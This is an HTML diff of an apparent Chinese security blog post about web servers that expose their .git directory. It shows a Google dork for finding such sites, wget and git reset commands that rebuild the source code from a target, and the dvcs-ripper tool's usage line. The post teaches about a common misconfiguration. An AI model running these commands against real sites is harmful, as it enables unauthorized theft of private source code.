@@ -73,7 +73,7 @@
 会在当前目录下产生.git目录，用来记录代码的变更等等</p>
 
 <p>.git目录结构如下</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>sky@linux:~/git-repo/test$ tree .git 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sky@linux:~/git-repo/test$ tree .git 
 .git 
 ├── branches 
 ├── config 
@@ -99,34 +99,31 @@
     └── tags 
 
 9 directories, 13 files 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>发布代码的之后，直接把开发目录拷贝过去（.git）也在里面，然后就中奖了。。。</p>
 
 <p>google一下：<code class="highlighter-rouge">".git"  intitle:"index of"</code></p>
 
 <p>人肉获取法：</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>mkdir git-test 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir git-test 
 cd git-test 
 #下载.git文件 
 wget --mirror --include-directories=/.git http://www.target.com/.git 
 cd www.target.com 
 #版本回退，得到了源代码 
 git reset --hard 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>如果apache是Options FollowSymLinks，.git访问是403，上面这种人肉法就失效了。。。</p>
 
 <p>需要借助工具，来遍历关键文件并下载恢复： 
 https://github.com/kost/dvcs-ripper</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>rip-git.pl 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rip-git.pl 
 
 Example: ./rip-git.pl -v -u http://www.example.com/.git/ 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>实例： 
 <a href="http://www.wooyun.org/bugs/wooyun-2014-076372">WooYun: 友盟网git服务使用不当导致源代码泄露</a> 
